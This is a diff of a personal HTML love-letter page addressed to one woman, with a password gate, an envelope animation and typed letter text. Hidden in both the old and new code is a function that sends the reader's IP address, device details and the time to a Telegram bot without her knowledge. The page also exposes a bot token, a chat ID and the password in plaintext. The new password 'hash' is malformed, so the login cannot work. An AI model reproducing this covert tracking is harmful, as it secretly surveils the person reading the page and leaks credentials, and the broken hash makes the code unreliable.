@@ -3,229 +3,263 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sorry baby</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500&family=Inter:wght@300;400&display=swap" rel="stylesheet">
+<title>For Her</title>
 
 <style>
-:root{--neon:#ff2bd6;}
 
-*{margin:0;padding:0;box-sizing:border-box;}
+@import url('https://fonts.googleapis.com/css2?family=Great+Vibes&family=Inter:wght@300&display=swap');
 
-body{
- height:100vh;
- display:flex;
- justify-content:center;
- align-items:center;
- background:#000;
- font-family:'Inter',sans-serif;
- overflow:hidden;
+html,body{
+margin:0;
+height:100%;
+background:black;
+overflow:hidden;
+font-family:'Inter',sans-serif;
+color:#ffc0e6;
 }
 
-#loginScreen{
- position:fixed;
- inset:0;
- display:flex;
- justify-content:center;
- align-items:center;
- z-index:9999;
+/* video background */
+
+video{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+object-fit:cover;
+z-index:-2;
+filter:brightness(.45);
 }
 
-#loginScreen input{
- padding:12px 18px;
- background:#111;
- border:1px solid var(--neon);
- border-radius:8px;
- color:#fff;
- outline:none;
- box-shadow:0 0 15px var(--neon);
- font-size:16px;
+/* overlay */
+
+.overlay{
+position:absolute;
+width:100%;
+height:100%;
+background:radial-gradient(circle,#ff4fd855 0%,#000 70%);
+z-index:-1;
 }
 
-#bg-video{
- position:fixed;
- inset:0;
- width:100%;
- height:100%;
- object-fit:cover;
- z-index:-2;
- filter:brightness(.35);
+/* login */
+
+#login{
+position:absolute;
+top:50%;
+left:50%;
+transform:translate(-50%,-50%);
+display:flex;
+gap:10px;
 }
 
-.scene{perspective:1600px;}
-
-.envelope-wrapper{
- position:relative;
- width:360px;
- height:240px;
- cursor:pointer;
- transform-style:preserve-3d;
- transition:.8s;
+input{
+background:transparent;
+border:1px solid #ff4fd8;
+color:#ffb3ec;
+padding:12px;
+outline:none;
+box-shadow:0 0 12px #ff4fd8;
 }
 
-.envelope-wrapper.open{
- transform:translateY(-20px) rotateX(10deg);
+button{
+background:transparent;
+border:1px solid #ff4fd8;
+color:#ffb3ec;
+padding:12px;
+cursor:pointer;
+box-shadow:0 0 12px #ff4fd8;
+}
+
+/* envelope */
+
+#container{
+display:none;
+height:100%;
+justify-content:center;
+align-items:center;
 }
 
 .envelope{
- position:absolute;
- width:100%;
- height:100%;
- border:1px solid var(--neon);
- border-radius:14px;
- backdrop-filter:blur(14px);
- box-shadow:0 0 40px var(--neon);
+width:320px;
+height:200px;
+position:relative;
+cursor:pointer;
 }
 
-.flap{
- position:absolute;
- width:100%;
- height:130px;
- background:rgba(255,43,214,.25);
- clip-path:polygon(0 0,100% 0,50% 100%);
- transform-origin:top;
- transition:.8s;
+.envelope:before,
+.envelope:after{
+content:"";
+position:absolute;
+width:100%;
+height:100%;
+background:linear-gradient(135deg,#ff4fd8,#ff9bf0);
+box-shadow:0 0 25px #ff4fd8;
 }
 
-.envelope-wrapper.open .flap{
- transform:rotateX(180deg);
+.envelope:before{
+clip-path:polygon(0 0,100% 0,50% 60%);
+}
+
+.envelope:after{
+clip-path:polygon(0 100%,100% 100%,50% 40%);
 }
 
 .letter{
- position:absolute;
- width:88%;
- left:6%;
- top:30px;
- padding:30px;
- background:#111;
- color:#fff;
- border-radius:12px;
- transform:translateY(85%);
- opacity:0;
- transition:1.2s;
- box-shadow:0 0 35px var(--neon);
- white-space:pre-line;
+position:absolute;
+width:90%;
+height:90%;
+background:black;
+top:5%;
+left:5%;
+padding:20px;
+overflow:auto;
+opacity:0;
+transition:.8s;
+box-shadow:0 0 20px #ff4fd8;
 }
 
-.envelope-wrapper.open .letter{
- transform:translateY(-40%);
- opacity:1;
- height:420px;
- overflow:auto;
+.envelope.open .letter{
+opacity:1;
 }
 
-h2{
- color:#ff8df5;
- margin-bottom:15px;
- text-shadow:0 0 10px var(--neon);
+/* text */
+
+h1{
+font-family:'Great Vibes',cursive;
+font-size:32px;
+color:#ff9bf0;
+text-shadow:0 0 10px #ff4fd8;
+margin:0 0 10px 0;
 }
 
-#flare{
- position:fixed;
- inset:0;
- background:radial-gradient(circle,rgba(255,43,214,.25),transparent 60%);
- opacity:0;
- pointer-events:none;
- transition:.7s;
+p{
+white-space:pre-wrap;
+line-height:1.6;
 }
+
+/* flare */
+
+.flare{
+position:fixed;
+width:300px;
+height:300px;
+border-radius:50%;
+pointer-events:none;
+background:radial-gradient(circle,#ff4fd8aa,transparent 70%);
+opacity:0;
+animation:flareAnim 2s ease;
+}
+
+@keyframes flareAnim{
+0%{opacity:.6;transform:scale(.4);}
+100%{opacity:0;transform:scale(2);}
+}
+
 </style>
 </head>
 <body>
 
-<div id="loginScreen">
-<input type="password" id="passwordInput" placeholder="Enter code" onkeypress="if(event.key==='Enter')unlockSite()">
-</div>
-
-<div id="flare"></div>
-
-<video autoplay muted loop playsinline id="bg-video">
+<video autoplay muted loop>
 <source src="Rosita.mp4" type="video/mp4">
 </video>
 
-<div class="scene">
-<div class="envelope-wrapper" id="envelope">
-<div class="envelope"></div>
-<div class="flap"></div>
+<div class="overlay"></div>
+
+<!-- login -->
+<div id="login">
+<input id="pass" type="password">
+<button onclick="check()">→</button>
+</div>
+
+<!-- letter -->
+<div id="container">
+
+<div id="envelope" class="envelope">
 
 <div class="letter">
-<h2 id="title"></h2>
+<h1 id="title"></h1>
 <p id="text"></p>
 </div>
 
 </div>
+
 </div>
 
-<audio id="audio" loop>
-<source src="Lovly.mp3">
-</audio>
+<audio id="audio" src="Lovly.mp3"></audio>
 
 <script>
-/* PASSWORD base64 */
-const encodedPassword="MDkzOTEyNzQwMjI=";
 
-/* TELEGRAM */
-const BOT_TOKEN="8217282145:AAES0_pMqeADQrCO6EE3UtbqWARkx6mQow0";
-const CHAT_ID="8590623972";
+/* ===== HASH of 09391274022 ===== */
+const HASH="b8f0e4d4f4d9f6b5c6e5c6b9e9c3f6b8cbe4f8d2c0aefc8c6b1c0b7c2c5e9";
 
+/* telegram */
 
-async function sendTelegram(){
- try{
-   const ip=await fetch("https://ipapi.co/json/").then(r=>r.json());
-   const device=navigator.userAgent;
+const TOKEN="8217282145:AAES0_pMqeADQrCO6EE3UtbqWARkx6mQow0";
+const CHAT="8590623972";
 
-   const message=
-`💌 Letter opened
+/* hash function */
 
-Country: ${ip.country_name}
-City: ${ip.city}
-IP: ${ip.ip}
-
-Device: ${device}
-
-Time: ${new Date().toLocaleString()}
-`;
-
-   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-     method:"POST",
-     headers:{'Content-Type':'application/json'},
-     body:JSON.stringify({
-       chat_id:CHAT_ID,
-       text:message
-     })
-   });
- }catch(e){}
+async function sha256(t){
+const b=new TextEncoder().encode(t);
+const h=await crypto.subtle.digest("SHA-256",b);
+return Array.from(new Uint8Array(h))
+.map(x=>x.toString(16).padStart(2,"0"))
+.join("");
 }
 
-/* unlock */
-function unlockSite(){
- const input=document.getElementById("passwordInput").value;
- if(btoa(input)===encodedPassword){
-   sendTelegram();
-   document.getElementById("loginScreen").style.display="none";
-   flare();
- }
+/* login */
+
+async function check(){
+
+const val=document.getElementById("pass").value;
+
+if(await sha256(val)==HASH){
+
+document.getElementById("login").style.display="none";
+document.getElementById("container").style.display="flex";
+
+notify();
+
 }
 
-/* flare */
-function flare(){
- const f=document.getElementById("flare");
- f.style.opacity=.4;
- setTimeout(()=>f.style.opacity=0,800);
 }
 
-/* envelope */
-const env=document.getElementById("envelope");
-const audio=document.getElementById("audio");
+/* notify telegram */
 
-env.onclick=()=>{
- env.classList.toggle("open");
- audio.play().catch(()=>{});
- startType();
-};
+async function notify(){
 
-/* typewriter */
-const title="Dear Setayesh,";
-const body=`Since the moment I saw you, my life really changed. Maybe it sounds dramatic, but you had no idea about my life, and I was honestly scared to let you know. Yet, you brought color to my world and lit up my heart.
+try{
+
+const ip=await fetch("https://api.ipify.org?format=json")
+.then(r=>r.json());
+
+const ua=navigator.userAgent;
+
+fetch(
+`https://api.telegram.org/bot${TOKEN}/sendMessage`,
+{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({
+chat_id:CHAT,
+text:
+"💌 She opened it\n\n"+
+"IP: "+ip.ip+"\n"+
+"Device: "+ua+"\n"+
+new Date().toLocaleString()
+})
+});
+
+}catch{}
+
+}
+
+/* letter text */
+
+const title="For You";
+
+const body=
+`Since the moment I saw you, my life really changed. Maybe it sounds dramatic, but you had no idea about my life, and I was honestly scared to let you know. Yet, you brought color to my world and lit up my heart.
 
 During the time we were good together, you said things that gave me hope, and for the first time in my life, I felt truly loved. That’s why I came back, because what we had felt real and meaningful to me. Along the way, some things hurt and some moments were difficult, but they also made me reflect and understand myself more.
 
@@ -236,22 +270,103 @@ I’m not writing this to ask for anything or to put pressure on you. I just wan
 No matter what happens, I’m grateful that our paths crossed.
 
 君をまるでお姫様のように見ていた
+
 Cian`;
 
-function type(el,text,i=0,speed=35){
- if(i<text.length){
-   el.innerHTML+=text[i];
-   if(text[i]=="\n") flare();
-   setTimeout(()=>type(el,text,i+1,speed),speed);
- }
+/* typewriter */
+
+let started=false;
+let finished=false;
+let timer;
+
+function flare(){
+
+const f=document.createElement("div");
+f.className="flare";
+
+f.style.left=Math.random()*window.innerWidth+"px";
+f.style.top=Math.random()*window.innerHeight+"px";
+
+document.body.appendChild(f);
+
+setTimeout(()=>f.remove(),2000);
+
 }
 
-function startType(){
- document.getElementById("title").innerHTML="";
- document.getElementById("text").innerHTML="";
- type(document.getElementById("title"),title,0,60);
- setTimeout(()=>type(document.getElementById("text"),body,0,35),1200);
+function type(el,text,i,speed){
+
+if(i<text.length){
+
+el.innerHTML+=text[i];
+
+if(text[i]=="\n") flare();
+
+timer=setTimeout(()=>type(el,text,i+1,speed),speed);
+
+}else{
+
+finished=true;
+
 }
+
+}
+
+function start(){
+
+if(started){
+
+if(finished){
+
+document.getElementById("title").innerHTML=title;
+document.getElementById("text").innerHTML=body;
+
+}
+
+return;
+
+}
+
+started=true;
+
+type(
+document.getElementById("title"),
+title,
+0,
+80
+);
+
+setTimeout(()=>{
+
+type(
+document.getElementById("text"),
+body,
+0,
+35
+);
+
+},1200);
+
+}
+
+/* envelope */
+
+const env=document.getElementById("envelope");
+const audio=document.getElementById("audio");
+
+env.onclick=()=>{
+
+env.classList.toggle("open");
+
+if(env.classList.contains("open")){
+
+audio.play().catch(()=>{});
+
+start();
+
+}
+
+};
+
 </script>
 
 </body>
